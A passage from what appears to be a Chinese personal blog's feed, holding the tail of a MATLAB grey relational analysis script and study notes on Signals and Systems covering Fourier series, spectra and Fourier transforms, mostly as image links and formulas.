operator">-</span><span class="token number">0.37168</span> <span class="token operator">-</span><span class="token number">1.10562</span> <span class="token number">0.42672</span> <span class="token number">0.61021</span> <span class="token operator">-</span><span class="token number">0.34589</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1.16317</span> <span class="token operator">-</span><span class="token number">1.07604</span> <span class="token operator">-</span><span class="token number">1.12929</span> <span class="token operator">-</span><span class="token number">0.96471</span> <span class="token operator">-</span><span class="token number">0.81708</span> <span class="token number">0.56002</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">1.85967</span> <span class="token operator">-</span><span class="token number">0.97923</span> <span class="token number">1.44097</span> <span class="token number">0.28896</span> <span class="token number">0.71491</span> <span class="token number">0.87223</span> <span class="token number">0.13648</span> <span class="token operator">-</span><span class="token number">0.21929</span> <span class="token number">2.1743</span> <span class="token operator">-</span><span class="token number">0.63072</span> <span class="token operator">-</span><span class="token number">1.24546</span> <span class="token number">0.93031</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.70924</span> <span class="token operator">-</span><span class="token number">0.03905</span> <span class="token number">0.66641</span> <span class="token number">0.91332</span> <span class="token number">0.17259</span> <span class="token number">0.77223</span> <span class="token number">0.17259</span> <span class="token operator">-</span><span class="token number">0.60342</span> <span class="token number">0.13731</span> <span class="token number">0.84278</span> <span class="token operator">-</span><span class="token number">0.1096</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token number">0.06677</span> <span class="token number">1.61879</span> <span class="token number">2.46535</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">1.48525</span> <span class="token operator">-</span><span class="token number">0.6387</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">4.79574</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token number">1.56377</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span> <span class="token operator">-</span><span class="token number">0.2446</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span> <span class="token operator">-</span><span class="token number">0.31198</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token comment">%原始数据14行19列</span>x<span class="token operator">=</span>x1<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>x1<span class="token operator">=</span>x<span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">x1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span>max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">>=</span>max      max<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">14</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">19</span>    <span class="token keyword">if</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>min      min<span class="token operator">=</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span>k<span class="token operator">=</span><span class="token number">0.5</span> <span class="token comment">%分辨系数取值</span>l<span class="token operator">=</span><span class="token punctuation">(</span>min<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token operator">./</span><span class="token punctuation">(</span>x<span class="token operator">+</span>k<span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token comment">%求关联系数矩阵</span>guanlianxing<span class="token operator">=</span><span class="token function">sum</span><span class="token punctuation">(</span>l<span class="token operator">'</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">[</span>rs<span class="token punctuation">,</span>rind<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">sort</span><span class="token punctuation">(</span>guanlianxing<span class="token punctuation">,</span><span class="token string">'descend'</span><span class="token punctuation">)</span> <span class="token comment">%对关联度进行排序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="附录5-表单2数据规律统计表"><a href="#附录5-表单2数据规律统计表" class="headerlink" title="附录5 表单2数据规律统计表"></a>附录5 表单2数据规律统计表</h4>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>补充知识：《信号与系统》</title>
      <link href="/2022/11/01/%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/11/01/%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001142352445.png" alt="image-20221001142352445" style="zoom:80%;" /><h2 id="时域分析（连续信号）"><a href="#时域分析（连续信号）" class="headerlink" title="时域分析（连续信号）"></a>时域分析（连续信号）</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001142709864.png" alt="image-20221001142709864"></p><p>$f(t)=f(t)*\delta(t)=\int_{-\infty}^{\infty}f(\tau)\delta(t-\tau)d\tau$</p><p>​    基本信号求出基本响应。任意信号可以分解为基本信号的线性组合（求和式）：连续-&gt;卷积积分，所以知道分解就可以求出复杂输入信号的响应。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001145109238.png" alt="image-20221001145109238" style="zoom:50%;" /><p>时域分析的要点：以冲激函数为基本信号，任意输入信号可分解为一系列冲击函数；而<br>$$<br>y_{zs}(t)=h(t)*f(t)\qquad(卷积)<br>$$</p><h2 id="频域分析"><a href="#频域分析" class="headerlink" title="频域分析"></a>频域分析</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001145653880.png" alt="image-20221001145653880"></p><p>系统分析的独立变量是频率，分析是在频率空间进行的，故称为频率域分析，简称<strong>频域分析（傅里叶分析）</strong>。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911200849193.png" alt="image-20220911200849193" style="zoom:67%;" /><p>​    频域分析法要点<strong>以正弦信号和虚指数信号为基本信号</strong>，将任意输入信号分解为一系列不同频率的正弦信号或虚指数信号之和，再利用LTI性质求出系统的响应。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001145818018.png" alt="image-20221001145818018" style="zoom: 50%;" /><h1 id="信号分解为正交函数"><a href="#信号分解为正交函数" class="headerlink" title="信号分解为正交函数"></a>信号分解为正交函数</h1><p><strong>信号怎样分解最有效？                信号分解为正交函数</strong></p><p>信号 -&gt; 矢量</p><ul><li>信号分解 -&gt; 矢量分解 -&gt; 矢量正交 -&gt; 信号正交</li><li>信号 -&gt; 正交集/分解成正交信号的组合</li></ul><h2 id="矢量的正交分解"><a href="#矢量的正交分解" class="headerlink" title="矢量的正交分解"></a>矢量的正交分解</h2><ul><li><p>矢量正交：2个矢量的点积/内积为0</p></li><li><p>正交矢量集：n对正交矢量的集合</p></li><li><p>非正交矢量的近似表示及误差 -&gt; 误差最小$\theta_{V_{e}}=90^{o}$</p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001150350703.png" alt="image-20221001150350703">                $\stackrel{\rightharpoonup}{V_{e}}\stackrel{\Delta}{=}\stackrel{\rightharpoonup}{V_{1}}-c_{12}\stackrel{\rightharpoonup}{V_{2}}\<br>用与V_{2}成比例的矢量c_{12}\stackrel{\rightharpoonup}{V_{2}}近似表示\stackrel{\rightharpoonup}{V_{1}}\<br>|c_{12}\stackrel{\rightharpoonup}{V_{2}}|=|\stackrel{\rightharpoonup}{V_{1}}|\cos\theta\<br>c_{12}=\frac{|\stackrel{\rightharpoonup}{V_{1}}|\cos\theta}{|\stackrel{\rightharpoonup}{V_{2}}|}={|\stackrel{\rightharpoonup}{V_{1}}||\stackrel{\rightharpoonup}{V_{2}}|\cos\theta}{|\stackrel{\rightharpoonup}{V_{2}}||\stackrel{\rightharpoonup}{V_{2}}|}=\frac{\stackrel{\rightharpoonup}{V_{1}}\cdot\stackrel{\rightharpoonup}{V_{2}}}{\stackrel{\rightharpoonup}{V_{2}}\cdot\stackrel{\rightharpoonup}{V_{2}}}\<br>推广:c_{1r}=\frac{\stackrel{\rightharpoonup}{V_{1}}\cdot\stackrel{\rightharpoonup}{V_{r}}}{\stackrel{\rightharpoonup}{V_{r}}\cdot\stackrel{\rightharpoonup}{V_{r}}}\qquad\stackrel{\rightharpoonup}{V_{r}}是分量\<br>正交时，\stackrel{\rightharpoonup}{V_{2}}无法表示\stackrel{\rightharpoonup}{V_{1}}，c_{12}=0$</p></li><li><p>矢量正交分解：</p></li></ul><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001150737398.png"></p><p>-&gt; 推广到n维空间</p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001150925530.png" alt="image-20221001150925530"></p><p><font color="red">思路</font>：将矢量空间正交分解的概念推广到信号空间——在信号空间找到<strong>若干个相互正交的信号作为基本信号</strong>，使得信号空间中任意信号均可表示成它们的线性组合。</p><h2 id="信号的正交分解"><a href="#信号的正交分解" class="headerlink" title="信号的正交分解"></a>信号的正交分解</h2><p><strong>信号空间里怎样构建信号分解？</strong></p><ul><li>信号正交</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911211511055.png" style="zoom:33%;" /><ul><li>正交函数集</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911212048453.png" alt="image-20220911212048453" style="zoom: 33%;" /><ul><li>标准正交函数集：$K_{i}=1$</li><li>完备正交函数集(全部找到又不多找)</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911212204307.png" alt="image-20220911212204307" style="zoom:33%;" /><ul><li><p>典型例子</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911213350683.png" alt="image-20220911213350683" style="zoom:33%;" /></li></ul><h3 id="Delta-信号的正交分解"><a href="#Delta-信号的正交分解" class="headerlink" title="$\Delta$信号的正交分解"></a><strong>$\Delta$信号的正交分解</strong></h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215221402.png" alt="image-20220911215221402" style="zoom:50%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001151737883.png" alt="image-20221001151737883"></p><h3 id="Delta-广义傅里叶系数"><a href="#Delta-广义傅里叶系数" class="headerlink" title="$\Delta$广义傅里叶系数"></a>$\Delta$广义傅里叶系数</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215403170.png" alt="image-20220911215403170" style="zoom:50%;" /><h2 id="帕斯瓦尔定理"><a href="#帕斯瓦尔定理" class="headerlink" title="帕斯瓦尔定理"></a>帕斯瓦尔定理</h2><p>例子：$f(t)$是电压，$f(t)$加载在$1\Omega$的电阻上产生的瞬时功率的$f^{2}(t)$：求积分 -&gt; 能量 = 分量和（能量守恒）</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215615624.png" alt="image-20220911215615624" style="zoom:50%;" /><ul><li>详述：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220911215801393.png" alt="image-20220911215801393" style="zoom: 33%;" /></li></ul><h1 id="周期信号傅里叶级数"><a href="#周期信号傅里叶级数" class="headerlink" title="周期信号傅里叶级数"></a>周期信号傅里叶级数</h1><p>$f(t)$信号</p><p>$\varphi_{i}$完备正交函数集</p><h2 id="三角形式的傅里叶级数"><a href="#三角形式的傅里叶级数" class="headerlink" title="三角形式的傅里叶级数"></a>三角形式的傅里叶级数</h2><p>$$<br>f(t)=\sum_{i=1}^{\infty}C_{i}\varphi_{i}(t)\qquad\qquad广义傅里叶展开式\<br>C_{i}=\frac{\int_{t_{2}}^{t_{1}}f(t)\varphi_{i}(t)dt}{\int_{t_{2}}^{t_{1}}\varphi_{i}(t)\varphi_{i}^{*}(t)dt}\qquad\qquad广义傅里叶系数<br>$$</p><p>推广具体，令$\varphi_{i}$为三角函数集</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001154528732.png" alt="image-20221001154528732" style="zoom: 50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001154612057.png" alt="image-20221001154612057" style="zoom: 50%;" /><h3 id="狄里赫利-Dirichlet-条件"><a href="#狄里赫利-Dirichlet-条件" class="headerlink" title="狄里赫利(Dirichlet)条件"></a>狄里赫利(Dirichlet)条件</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001155223271.png" alt="image-20221001155223271" style="zoom: 33%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001155238503.png" alt="image-20221001155238503" style="zoom:33%;" /><p>间断点为第一类间断点：一个信号在这点间断，但左右导数存在</p><h3 id="余弦形式的傅里叶级数"><a href="#余弦形式的傅里叶级数" class="headerlink" title="余弦形式的傅里叶级数"></a>余弦形式的傅里叶级数</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001155710589.png" alt="image-20221001155710589" style="zoom: 50%;" /><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160013251.png" alt="image-20221001160013251"  /><p>如果$f(t)$是奇函数，$a_{n}=0$</p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160115260.png" alt="image-20221001160115260"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160319854.png" alt="image-20221001160319854"></p><h4 id="吉布斯现象"><a href="#吉布斯现象" class="headerlink" title="吉布斯现象"></a>吉布斯现象</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001160346217.png" alt="image-20221001160346217"></p><h3 id="波形的对称性和谐波特性"><a href="#波形的对称性和谐波特性" class="headerlink" title="波形的对称性和谐波特性"></a>波形的对称性和谐波特性</h3><h4 id="对称性"><a href="#对称性" class="headerlink" title="对称性"></a>对称性</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165450041.png" alt="image-20221001165450041"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165430915.png" alt="image-20221001165430915"></p><h4 id="谐波性"><a href="#谐波性" class="headerlink" title="谐波性"></a>谐波性</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165520416.png" alt="image-20221001165520416"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001165548907.png" alt="image-20221001165548907"></p><h2 id="指数形式的傅里叶级数"><a href="#指数形式的傅里叶级数" class="headerlink" title="指数形式的傅里叶级数"></a>指数形式的傅里叶级数</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001173647416.png" alt="image-20221001173647416"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001172438805.png" alt="image-20221001172438805"></p><p>$因为n=0时，为\frac{A_{0}}{2}；n为(-\infty,-1)和(1,+\infty)正好构成(-\infty,+\infty)，所以可以合在一起$  </p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001172519381.png" alt="image-20221001172519381"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001172858648.png" alt="image-20221001172858648" style="zoom: 50%;" /><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001173239425.png" alt="image-20221001173239425"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001174203167.png" alt="image-20221001174203167"></p><h2 id="傅里叶系数之间的关系"><a href="#傅里叶系数之间的关系" class="headerlink" title="傅里叶系数之间的关系"></a>傅里叶系数之间的关系</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001180513079.png" alt="image-20221001180513079" style="zoom: 50%;" />$$2|F_{n}|=A_{n}$$<h1 id="周期信号的频谱"><a href="#周期信号的频谱" class="headerlink" title="周期信号的频谱"></a>周期信号的频谱</h1><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211253730.png" alt="image-20221001211253730"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211358246.png" alt="image-20221001211358246"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211416406.png" alt="image-20221001211416406"></p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211457037.png" alt="image-20221001211457037"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211609782.png" alt="image-20221001211609782"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221001211525552.png" alt="image-20221001211525552"></p><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002102758736.png" alt="image-20221002102758736" style="zoom: 67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002102840282.png" alt="image-20221002102840282" style="zoom: 67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002102943627.png" alt="image-20221002102943627" style="zoom:67%;" /><h2 id="频谱的特点"><a href="#频谱的特点" class="headerlink" title="频谱的特点"></a>频谱的特点</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002110156885.png" alt="image-20221002110156885" style="zoom: 50%;" />$$\textcolor{red}{因为Sa(x)=\frac{sinx}{x}，所以F_{n}=\frac{\tau}{T}Sa(\frac{n\Omega\tau}{2})}$$<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002110950896.png" alt="image-20221002110950896" style="zoom:50%;" /><h3 id="频谱的特点-1"><a href="#频谱的特点-1" class="headerlink" title="频谱的特点"></a>频谱的特点</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002111050215.png" alt="image-20221002111050215"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002113935706.png" alt="image-20221002113935706" style="zoom:50%;" /><h3 id="tau-和-T-变化关系"><a href="#tau-和-T-变化关系" class="headerlink" title="$\tau$和$T$变化关系"></a>$\tau$和$T$变化关系</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002111338972.png" alt="image-20221002111338972" style="zoom:50%;" /><p>当$T$不变，$\tau$变小时，周期不变，脉冲宽度变窄。幅度$\frac{\tau}{T}$下降；$\Omega$不变；$\frac{2m\pi}{\tau}$零点增大导致零点间远移，$\frac{T}{\tau}$两零点间谱线数增多。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002111402152.png" alt="image-20221002111402152" style="zoom:50%;" /><p><font color="red">傅里叶级数向傅里叶变换的节点，非周期信号周期为1，下一周期在无穷远处。</font></p><h3 id="收敛性分析"><a href="#收敛性分析" class="headerlink" title="收敛性分析"></a>收敛性分析</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002113612829.png" alt="image-20221002113612829" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002113639399.png" alt="image-20221002113639399" style="zoom:50%;" /><h3 id="平均功率——Parseval等式"><a href="#平均功率——Parseval等式" class="headerlink" title="平均功率——Parseval等式"></a>平均功率——Parseval等式</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002140515705.png" alt="image-20221002140515705" style="zoom:50%;" /><p>表明：对于周期信号，在时域中求得的信号功率与在频域中求得的信号功率相等。</p><h3 id="频带宽度"><a href="#频带宽度" class="headerlink" title="频带宽度"></a>频带宽度</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002114502516.png" alt="image-20221002114502516" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002114522013.png" alt="image-20221002114522013" style="zoom:50%;" /><p>例题</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151518586.png" alt="image-20221002151518586" style="zoom:50%;" /><h1 id="非周期信号傅里叶变换"><a href="#非周期信号傅里叶变换" class="headerlink" title="非周期信号傅里叶变换"></a>非周期信号傅里叶变换</h1><h2 id="非周期信号的频谱"><a href="#非周期信号的频谱" class="headerlink" title="非周期信号的频谱"></a>非周期信号的频谱</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151600985.png" alt="image-20221002151600985" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151632167.png" alt="image-20221002151632167" style="zoom:50%;" /><p>注意：虽然各频率分量的幅度趋近于无穷小，但无穷小量之间仍有相对大小差别，故引入频谱密度函数。</p><h2 id="频谱密度函数"><a href="#频谱密度函数" class="headerlink" title="频谱密度函数"></a>频谱密度函数</h2><p>​    <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002151801570.png" alt="image-20221002151801570" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002152154234.png" alt="image-20221002152154234" style="zoom:50%;" /></p><p>​    <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002152239108.png" alt="image-20221002152239108" style="zoom: 33%;" /><br>$$<br>\textcolor{red}{F_{n}频谱是实际频谱大小，F(j\omega)为非周期信号的频谱，将无穷小放大为无穷大倍，实际为频谱密度}<br>$$</p><h2 id="傅里叶变换"><a href="#傅里叶变换" class="headerlink" title="傅里叶变换"></a>傅里叶变换</h2><h3 id="傅里叶正变换-f-t-rightarrow-F-j-omega"><a href="#傅里叶正变换-f-t-rightarrow-F-j-omega" class="headerlink" title="傅里叶正变换$f(t) \rightarrow F(j\omega)$"></a>傅里叶正变换$f(t) \rightarrow F(j\omega)$</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002163527904.png" alt="image-20221002163527904"><br>$$<br>周期函数：F_{n}/A_{n}\sim\Omega\<br>非周期函数：|F(j\omega)|/\varphi(\omega)\sim\omega<br>$$</p><h3 id="傅里叶反变换-F-j-omega-rightarrow-f-t"><a href="#傅里叶反变换-F-j-omega-rightarrow-f-t" class="headerlink" title="傅里叶反变换$F(j\omega)\rightarrow f(t)$"></a>傅里叶反变换$F(j\omega)\rightarrow f(t)$</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164054057.png" alt="image-20221002164054057"></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164254793.png" alt="image-20221002164254793"></p><h3 id="Delta-傅里叶变换对"><a href="#Delta-傅里叶变换对" class="headerlink" title="$\Delta$傅里叶变换对"></a>$\Delta$傅里叶变换对</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164345417.png" alt="image-20221002164345417"></p><p>​    <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164444007.png" alt="image-20221002164444007"  /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164456092.png" alt="image-20221002164456092"  /></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164216208.png" alt="image-20221002164216208" style="zoom: 67%;" /><h2 id="常用函数的傅里叶变换"><a href="#常用函数的傅里叶变换" class="headerlink" title="常用函数的傅里叶变换"></a>常用函数的傅里叶变换</h2><h3 id="单边指数函数"><a href="#单边指数函数" class="headerlink" title="单边指数函数"></a>单边指数函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164632973.png" alt="image-20221002164632973"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164701474.png" alt="image-20221002164701474"></p><h3 id="双边指数函数"><a href="#双边指数函数" class="headerlink" title="双边指数函数"></a>双边指数函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164735610.png" alt="image-20221002164735610"></p><h3 id="门函数（矩形脉冲）"><a href="#门函数（矩形脉冲）" class="headerlink" title="门函数（矩形脉冲）"></a>门函数（矩形脉冲）</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164812021.png" alt="image-20221002164812021"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164830519.png" alt="image-20221002164830519"></p><h3 id="激冲函数"><a href="#激冲函数" class="headerlink" 